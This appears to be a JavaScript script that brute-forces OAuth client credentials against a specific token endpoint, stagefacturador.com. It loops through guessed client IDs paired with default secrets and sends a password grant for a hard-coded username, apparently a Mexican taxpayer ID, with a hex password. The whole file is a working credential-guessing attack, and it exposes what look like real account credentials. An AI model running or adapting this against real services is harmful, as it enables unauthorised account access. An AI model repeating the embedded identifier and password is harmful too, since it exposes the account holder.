const authUrl = 'https://authcli.stagefacturador.com/connect/token';

const commonClients = [
    { id: 'authcli', secret: 'secret' },
    { id: 'api', secret: 'secret' },
    { id: 'facturador', secret: 'secret' },
    { id: 'webapi', secret: 'secret' },
    { id: 'client', secret: 'secret' },
    { id: 'ro.client', secret: 'secret' },
    { id: 'GOYA780416GM0', secret: 'secret' },
    { id: 'GOYA780416GM0', secret: '20b03da6247eb1ba4a04c3bda7285c94' },
    { id: 'autofacturador', secret: 'secret' }
];

async function test(client) {
  const authBody = new URLSearchParams({
    grant_type: 'password',
    username: 'GOYA780416GM0',
    password: '20b03da6247eb1ba4a04c3bda7285c94',
    scope: 'api1'
  });

  const basicAuth = btoa(`${client.id}:${client.secret}`);
  const res = await fetch(authUrl, {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': `Basic ${basicAuth}`
    },
    body: authBody,
  });
  const data = await res.text();
  console.log(`[${client.id}] -> ${res.status} : ${data.slice(0, 50)}`);
}

async function run() {
    for (const client of commonClients) {
        await test(client);
    }
}
run();
